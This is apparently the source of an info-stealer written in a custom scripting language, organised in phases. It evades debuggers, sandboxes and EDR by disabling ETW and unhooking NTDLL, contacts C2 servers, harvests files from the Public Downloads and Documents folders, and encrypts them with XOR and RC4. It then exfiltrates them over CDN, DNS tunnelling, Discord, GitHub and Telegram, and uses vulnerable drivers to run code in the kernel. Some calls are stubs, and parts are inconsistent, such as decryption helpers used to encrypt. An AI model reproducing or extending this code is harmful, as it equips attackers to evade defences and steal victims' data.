// ===== PHASE 0: ANTI-ANALYSIS & EDR EVASION =====
fn phase_anti_analysis() -> bool {
    println("[*] Phase 0: Anti-Analysis & EDR Evasion")

    // Check for debuggers
    if jocky_is_debugger_present() {
        println("    [!] Debugger detected!")
        return false
    }
    println("    [+] Debugger check passed")

    // Check for VM
    if jocky_is_vm() {
        println("    [!] VM detected - adjusting behavior")
        jocky_sleep_and_recheck()
    }
    println("    [+] VM check complete")

    // Check for sandbox
    if jocky_is_sandbox() {
        println("    [!] Sandbox detected - aborting")
        return false
    }
    println("    [+] Sandbox check passed")

    // Disable ETW (Event Tracing for Windows)
    if jocky_disable_etw("") {
        println("    [+] ETW disabled successfully")
        bypass_active = true
    }

    // Disable EDR callbacks
    if jocky_disable_edr_callbacks("") {
        println("    [+] EDR callbacks disabled")
        edr_disabled = true
    }

    // Disable OB callbacks (Object Manager callbacks)
    if jocky_disable_ob_callbacks() {
        println("    [+] OB callbacks disabled")
    }

    // Unhook NTDLL (remove API hooks)
    if jocky_unhook_ntdll() {
        println("    [+] NTDLL unhooked - direct syscalls enabled")
    }

    println("[+] EDR evasion phase complete")
    println("")
    return true
}

// ===== PHASE 1: C2 BOOTSTRAP & CONFIGURATION =====
fn phase_bootstrap_c2() -> bool {
    println("[*] Phase 1: C2 Bootstrap & Configuration")

    let config_json = fetch_c2_config(C2_PRIMARY)
    if config_json != "" {
        println("    [+] PRIMARY C2 responded")
        c2_config_fresh = true
        return true
    }

    println("    [-] Primary C2 failed, trying fallback...")
    let fallback_config = fetch_c2_config(C2_FALLBACK)
    if fallback_config != "" {
        println("    [+] FALLBACK C2 responded")
        c2_config_fresh = true
        return true
    }

    println("    [!] No C2 available - using hardcoded config")
    cdn_endpoint = "http://localhost:9000/upload"
    cdn_token = "Bearer_fallback_token"
    model_path = LOCAL_MODEL_PATH

    println("[+] C2 Bootstrap complete")
    println("")
    return true
}

fn fetch_c2_config(c2_url: string) -> string {
    println("        Querying: " + c2_url)
    return ""
}

// ===== PHASE 2: DATA DISCOVERY =====
fn phase_discover_data() -> bool {
    println("[*] Phase 2: Data Discovery & Inventory")

    var target_count = 0
    for target_path in DATA_TARGETS {
        if fs_exists(target_path) {
            println("    [+] Found target: " + target_path)

            // List files in target
            let files = fs_list_files(target_path, true)
            if strlen(files) > 0 {
                println("        Files found: " + string(strlen(files)) + " bytes")
                target_count = target_count + 1
            }
        }
    }

    if target_count > 0 {
        println("[+] Data Discovery: " + string(target_count) + " targets identified")
    }

    println("")
    return target_count > 0
}

// ===== PHASE 3: DATA COLLECTION & THEFT =====
fn phase_collect_data() -> bool {
    println("[*] Phase 3: Data Collection & Theft")

    // Collect from Downloads
    println("    [*] Harvesting Downloads folder...")
    let downloads_path = "C:\\Users\\Public\\Downloads"
    if fs_exists(downloads_path) {
        let files = fs_list_files(downloads_path, true)
        if strlen(files) > 0 {
            println("    [+] Collected from Downloads: " + string(strlen(files)) + " bytes")
            collected_data = jocky_str_concat(collected_data, files)
        }
    }

    // Collect from Documents
    println("    [*] Harvesting Documents folder...")
    let docs_path = "C:\\Users\\Public\\Documents"
    if fs_exists(docs_path) {
        let files = fs_list_files(docs_path, true)
        if strlen(files) > 0 {
            println("    [+] Collected from Documents: " + string(strlen(files)) + " bytes")
            collected_data = jocky_str_concat(collected_data, files)
        }
    }

    // Collect registry data (Windows-specific)
    println("    [*] Harvesting registry...")
    if jocky_registry_create_key(0x80000002, "Software\\JOCKY", "") {
        println("    [+] Registry key created")

        if jocky_registry_set_value("", "CollectionTime", "current", 1) {
            println("    [+] Registry value set")
        }

        jocky_registry_close_key("")
    }

    println("[+] Data Collection: " + string(strlen(collected_data)) + " bytes harvested")
    println("")
    return strlen(collected_data) > 0
}

// ===== PHASE 4: ENCRYPTION & ENCODING =====
fn phase_encrypt_data() -> bool {
    println("[*] Phase 4: Data Encryption & Encoding")

    if strlen(collected_data) > 0 {
        println("    [*] Encrypting " + string(strlen(collected_data)) + " bytes...")

        // XOR encryption
        jocky_decrypt_xor(collected_data, strlen(collected_data), 0x42, 1)
        println("    [+] XOR encryption applied")

        // RC4 encryption
        jocky_decrypt_rc4(collected_data, strlen(collected_data), "encryption_key", 14)
        println("    [+] RC4 encryption applied")

        // Compression
        let compressed = jocky_compress_for_exfil(collected_data)
        println("    [+] Data compressed")

        println("[+] Encryption complete: " + string(strlen(compressed)) + " bytes")
    }

    println("")
    return true
}

// ===== PHASE 5: EXFILTRATION (MULTI-CHANNEL) =====
fn phase_exfiltrate_data() -> bool {
    println("[*] Phase 5: Multi-Channel Exfiltration")

    if strlen(collected_data) == 0 {
        println("    [!] No data to exfiltrate")
        return false
    }

    // Channel 1: CDN
    println("    [*] Attempting CDN exfiltration...")
    if jocky_exfil_front(cdn_endpoint, cdn_token, collected_data, "POST", 4096) {
        println("    [+] Data sent via CDN")
    }

    // Channel 2: DNS Tunneling
    println("    [*] Attempting DNS tunneling...")
    if jocky_exfil_dns(cdn_endpoint, collected_data, 256) {
        println("    [+] Data sent via DNS tunnel")
    }

    // Channel 3: Discord Webhook
    println("    [*] Attempting Discord exfiltration...")
    if jocky_exfil_discord(cdn_endpoint, collected_data, 2000) {
        println("    [+] Data sent via Discord webhook")
    }

    // Channel 4: GitHub
    println("    [*] Attempting GitHub exfiltration...")
    if jocky_exfil_github(cdn_endpoint, cdn_token, collected_data, 1024) {
        println("    [+] Data sent via GitHub")
    }

    // Channel 5: Telegram
    println("    [*] Attempting Telegram exfiltration...")
    if jocky_exfil_telegram(cdn_endpoint, cdn_token, "JOCKY", 512) {
        println("    [+] Data sent via Telegram")
    }

    println("[+] Exfiltration complete - data sent via all available channels")
    println("")
    return true
}

// ===== PHASE 6: BYOVD DRIVER CHAIN EXPLOITATION =====
fn phase_byovd_drivers() -> bool {
    println("[*] Phase 6: BYOVD Driver Chain Exploitation")

    var index = 0
    for driver_entry in DRIVER_CHAIN {
        let driver_name = driver_entry.0
        let device_path = driver_entry.1
        let ioctl_base = driver_entry.2

        println("  [" + string(index + 1) + "/" + string(array_len(DRIVER_CHAIN)) + "] " + driver_name)

        let handle = jocky_byovd_load(jocky_byovd_new(), device_path, "")
        if handle != 0 {
            println("      [+] LOADED - kernel access obtained")

            let test_result = jocky_byovd_load(handle, device_path, "")
            if test_result != 0 {
                println("      [+] EXPLOIT VERIFIED - code execution in kernel")
                println("[+] BYOVD chain successful")
                return true
            }
        }

        index = index + 1
    }

    println("[-] BYOVD chain exhausted")
    println("")
    return false
}

